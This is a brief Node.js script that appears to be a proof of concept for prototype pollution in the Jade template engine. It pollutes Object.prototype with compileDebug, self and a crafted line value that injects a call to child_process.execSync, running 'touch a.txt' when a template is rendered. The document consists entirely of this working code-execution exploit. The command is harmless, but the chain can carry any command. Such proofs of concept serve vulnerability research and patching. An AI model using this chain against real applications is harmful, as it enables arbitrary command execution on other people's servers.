var jade = require('jade');

Object.prototype.compileDebug = 1;
Object.prototype.self = 1;
Object.prototype.line = "console.log(global.process.mainModule.require('child_process').execSync('touch a.txt'))"

jade.renderFile('index.jade');